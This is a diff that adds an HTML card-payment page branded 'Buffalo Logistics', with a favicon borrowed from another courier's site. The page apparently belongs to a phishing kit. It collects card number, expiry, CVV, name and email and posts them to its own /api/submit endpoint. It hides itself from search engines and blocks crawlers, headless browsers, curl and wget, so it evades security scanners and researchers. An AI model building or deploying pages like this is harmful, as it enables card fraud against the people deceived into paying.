@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
+    <title>Secure Card Payment │ Buffalo Logistics</title>
+    <link rel="icon" type="image/x-icon" href="https://thecourierguy.co.za/img/favicon.ico" />
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f4f5f9;
+            color: #222;
+            min-height: 100%;
+        }
+        .topbar {
+            background: #191D63;
+            color: #fff;
+            padding: 14px 20px;
+            text-align: center;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .wrap {
+            max-width: 520px;
+            margin: 32px auto;
+            padding: 0 16px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 6px 24px rgba(0,0,0,0.06);
+            padding: 28px 24px;
+        }
+        h1 {
+            font-size: 20px;
+            color: #191D63;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 22px;
+        }
+        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .field { margin-bottom: 16px; }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        input[type="text"], input[type="tel"], input[type="email"] {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d6d8e0;
+            border-radius: 8px;
+            font-size: 15px;
+            background: #fff;
+            color: #222;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+        input:focus {
+            border-color: #191D63;
+            box-shadow: 0 0 0 3px rgba(25,29,99,0.12);
+        }
+        .order-summary {
+            background: #f7f8fc;
+            border: 1px solid #e6e8ef;
+            border-radius: 8px;
+            padding: 12px 14px;
+            margin-bottom: 22px;
+            font-size: 14px;
+            color: #333;
+        }
+        .order-summary strong { color: #191D63; }
+        .pay-btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: #191D63;
+            color: #fff;
+            border: 0;
+            border-radius: 999px;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.15s, opacity 0.15s;
+        }
+        .pay-btn:hover { background: #14174f; }
+        .pay-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .secure-note {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 14px;
+        }
+        .secure-note::before { content: "🔒 "; }
+        .error-msg {
+            background: #fee;
+            border: 1px solid #c33;
+            color: #c33;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        /* Honeypot — visually hidden but reachable to bots */
+        .hp-field {
+            position: absolute !important;
+            left: -9999px !important;
+            top: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+        }
+    </style>
+</head>
+<body>
+    <header class="topbar">Buffalo Logistics │ Secure Card Payment</header>
+    <main class="wrap">
+        <section class="card">
+            <h1>Card Payment</h1>
+            <p class="subtitle">Enter your card details to complete payment.</p>
+
+            <div class="order-summary" id="order-summary">
+                <strong>Payment method:</strong> <span id="vehicle-display">Card</span>
+            </div>
+
+            <div id="error-container" aria-live="assertive"></div>
+
+            <form id="paymentForm" action="/api/submit" method="POST" novalidate autocomplete="on">
+                <div class="field">
+                    <label for="cardholder">Cardholder name</label>
+                    <input type="text" id="cardholder" name="cardholder" required autocomplete="cc-name" placeholder="Name on card" />
+                </div>
+
+                <div class="field">
+                    <label for="card_number">Card number</label>
+                    <input type="tel" id="card_number" name="card_number" required autocomplete="cc-number" inputmode="numeric" maxlength="23" placeholder="1234 5678 9012 3456" />
+                </div>
+
+                <div class="row">
+                    <div class="field">
+                        <label for="card_expiry">Expiry (MM/YY)</label>
+                        <input type="tel" id="card_expiry" name="card_expiry" required autocomplete="cc-exp" inputmode="numeric" maxlength="5" placeholder="MM/YY" />
+                    </div>
+                    <div class="field">
+                        <label for="card_cvv">CVV</label>
+                        <input type="tel" id="card_cvv" name="card_cvv" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="123" />
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label for="email">Email (for receipt)</label>
+                    <input type="email" id="email" name="email" required autocomplete="email" placeholder="you@example.com" />
+                </div>
+
+                <!-- Pre-filled from index.html form GET -->
+                <input type="hidden" id="vehicle1" name="vehicle1" value="" />
+
+                <!-- Honeypot field (bots fill this) -->
+                <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
+                <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
+
+                <!-- Timing check -->
+                <input type="hidden" id="form_load_time" name="form_load_time" value="" />
+
+                <!-- 20-30 character browser session token -->
+                <input type="hidden" id="session_token" name="session_token" value="" />
+
+                <button type="submit" id="pay_button" class="pay-btn">Pay</button>
+            </form>
+
+            <p class="secure-note">Your payment is processed over a secure encrypted connection.</p>
+        </section>
+    </main>
+
+    <script>
+        // -------- 20-30 character session token --------
+        // Generated once per browser session, stored in sessionStorage,
+        // submitted as a hidden field, and exposed on window.__sessionToken.
+        (function () {
+            function generateSessionToken() {
+                var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                var length = 20 + Math.floor(Math.random() * 11); // 20..30 inclusive
+                var bytes;
+                if (window.crypto && typeof window.crypto.getRandomValues === 'function') {
+                    bytes = new Uint8Array(length);
+                    window.crypto.getRandomValues(bytes);
+                } else {
+                    bytes = new Array(length);
+                    for (var i = 0; i < length; i++) bytes[i] = Math.floor(Math.random() * 256);
+                }
+                var out = '';
+                for (var j = 0; j < length; j++) out += alphabet.charAt(bytes[j] % alphabet.length);
+                return out;
+            }
+            var token = null;
+            try { token = window.sessionStorage && window.sessionStorage.getItem('courrier_session_token'); } catch (e) {}
+            if (!token || token.length < 20 || token.length > 30) {
+                token = generateSessionToken();
+                try { if (window.sessionStorage) window.sessionStorage.setItem('courrier_session_token', token); } catch (e) {}
+            }
+            window.__sessionToken = token;
+        })();
+
+        // -------- Bot / crawler detection (client side) --------
+        // Server-side validation in /api/submit is the authoritative check;
+        // this is a fast pre-flight that blocks obvious headless tools.
+        function clientBotCheck() {
+            var ua = (navigator.userAgent || '').toLowerCase();
+            var badUA = /bot|crawler|spider|crawling|headless|puppeteer|playwright|phantomjs|selenium|wget|curl|python-requests|scrapy/i;
+            if (badUA.test(ua)) return 'Bot detected via User-Agent.';
+            // Headless Chrome flag
+            if (navigator.webdriver === true) return 'Automated browser detected.';
+            // No language list = highly suspicious
+            if (!navigator.languages || navigator.languages.length === 0) return 'Suspicious browser environment.';
+            return null;
+        }
+
+        // -------- Helpers --------
+        function getQueryParam(name) {
+            try {
+                var params = new URLSearchParams(window.location.search);
+                return params.get(name);
+            } catch (e) { return null; }
+        }
+        function showError(msg) {
+            var c = document.getElementById('error-container');
+            c.innerHTML = '';
+            var d = document.createElement('div');
+            d.className = 'error-msg';
+            d.setAttribute('role', 'alert');
+            d.textContent = msg;
+            c.appendChild(d);
+        }
+        function clearError() {
+            document.getElementById('error-container').innerHTML = '';
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Pre-fill vehicle1 from query string (e.g. ?vehicle1=Bike)
+            var vehicle = getQueryParam('vehicle1') || 'Card';
+            document.getElementById('vehicle1').value = vehicle;
+            document.getElementById('vehicle-display').textContent = vehicle;
+
+            // Stamp load time + session token for server-side bot detection
+            document.getElementById('form_load_time').value = Date.now();
+            document.getElementById('session_token').value = window.__sessionToken;
+
+            // Light input formatting: card number groups of 4, expiry MM/YY
+            var cardInput = document.getElementById('card_number');
+            cardInput.addEventListener('input', function () {
+                var v = this.value.replace(/\D/g, '').slice(0, 19);
+                var groups = v.match(/.{1,4}/g);
+                this.value = groups ? groups.join(' ') : '';
+            });
+            var expInput = document.getElementById('card_expiry');
+            expInput.addEventListener('input', function () {
+                var v = this.value.replace(/\D/g, '').slice(0, 4);
+                if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+                this.value = v;
+            });
+            var cvvInput = document.getElementById('card_cvv');
+            cvvInput.addEventListener('input', function () {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            });
+
+            // Submit handler — POSTs to /api/submit, redirects to /processing.html
+            var form = document.getElementById('paymentForm');
+            var payButton = document.getElementById('pay_button');
+
+            form.addEventListener('submit', async function (e) {
+                e.preventDefault();
+                clearError();
+
+                var botReason = clientBotCheck();
+                if (botReason) { showError(botReason); return; }
+
+                var originalText = payButton.textContent;
+                payButton.disabled = true;
+                payButton.textContent = 'Processing…';
+
+                try {
+                    var formData = new FormData(form);
+                    var response = await fetch('/api/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: new URLSearchParams(formData)
+                    });
+                    var result = await response.json();
+                    if (result && result.success) {
+                        window.location.href = result.redirect || '/processing.html';
+                        return;
+                    }
+                    showError((result && result.message) || 'Payment could not be processed. Please try again.');
+                } catch (err) {
+                    console.error('Submission error:', err);
+                    showError('A network error occurred. Please try again.');
+                } finally {
+                    payButton.disabled = false;
+                    payButton.textContent = originalText;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
